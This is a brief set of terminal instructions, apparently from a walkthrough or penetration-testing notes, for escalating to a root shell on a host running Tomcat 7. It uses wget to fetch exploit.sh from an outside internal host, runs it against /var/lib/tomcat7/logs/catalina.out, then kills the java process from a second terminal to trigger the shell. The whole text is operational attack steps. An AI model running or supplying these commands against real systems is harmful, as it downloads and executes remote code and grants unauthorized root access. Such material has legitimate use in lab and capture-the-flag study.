```
cd /tmp 2>&1
wget http://10.1.0.88:8001/exploit.sh 2>&1
bash exploit.sh /var/lib/tomcat7/logs/catalina.out 2>&1
```

Then in a second terminal:

```
pkill java -15 2>&1
```

And wait for the first termianl to give you a root shell.
